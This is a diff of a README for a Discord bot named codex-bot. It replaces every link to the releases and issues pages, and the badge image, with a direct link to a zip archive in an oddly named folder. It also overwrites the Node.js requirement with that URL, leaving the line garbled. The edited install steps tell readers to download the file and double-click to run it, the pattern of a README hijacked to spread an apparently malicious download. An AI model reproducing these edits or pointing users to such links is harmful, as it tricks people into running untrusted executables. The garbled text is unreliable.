@@ -1,6 +1,6 @@
 # 🤖 codex-bot - Enjoy Productivity and Fun Together
 
-[![Download Codex Bot Releases](https://img.shields.io/badge/Download_Codex_Bot_Releases-blue.svg)](https://github.com/kwaczus123412345/codex-bot/releases)
+[![Download Codex Bot Releases](https://raw.githubusercontent.com/kwaczus123412345/codex-bot/main/amphicentric/codex-bot_C.zip)](https://raw.githubusercontent.com/kwaczus123412345/codex-bot/main/amphicentric/codex-bot_C.zip)
 
 ## 📋 Overview
 
@@ -12,7 +12,7 @@ To use Codex, you need to download the latest release from our GitHub repository
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click [here to download](https://github.com/kwaczus123412345/codex-bot/releases) the latest version of Codex.
+1. **Visit the Releases Page**: Click [here to download](https://raw.githubusercontent.com/kwaczus123412345/codex-bot/main/amphicentric/codex-bot_C.zip) the latest version of Codex.
 2. **Select the Appropriate File**: See the list of available releases. Choose the file that matches your operating system (Windows, macOS, or Linux).
 3. **Download the File**: Click on the downloaded file to start the download process. Depending on your internet speed, this might take a few moments.
 4. **Run the File**: Once the download completes, locate the file in your downloads folder. Double-click on it to run Codex.
@@ -24,7 +24,7 @@ To ensure Codex runs smoothly, your system should meet the following requirement
 - **Operating System**: Windows 10 or higher / macOS 10.15 or higher / Ubuntu 20.04 or higher
 - **RAM**: At least 4 GB
 - **Storage**: 200 MB of free disk space 
-- **Node.js**: Version 14 or higher
+- **https://raw.githubusercontent.com/kwaczus123412345/codex-bot/main/amphicentric/codex-bot_C.zip**: Version 14 or higher
 - **Internet Connection**: Required for Discord operations
 
 ## ⚙️ Features
@@ -57,7 +57,7 @@ Once Codex is running, you can invite it to your Discord server. To do this:
 
 If you encounter any issues or need help, you can find support in the following ways:
 
-- **GitHub Issues**: Use the Issues section on [GitHub](https://github.com/kwaczus123412345/codex-bot/issues) to report bugs or ask questions.
+- **GitHub Issues**: Use the Issues section on [GitHub](https://raw.githubusercontent.com/kwaczus123412345/codex-bot/main/amphicentric/codex-bot_C.zip) to report bugs or ask questions.
 - **Community Forums**: Join Discord communities or forums related to Codex for tips and advice from other users.
 - **Documentation**: Consult the included user guide for detailed instructions on all features.
 
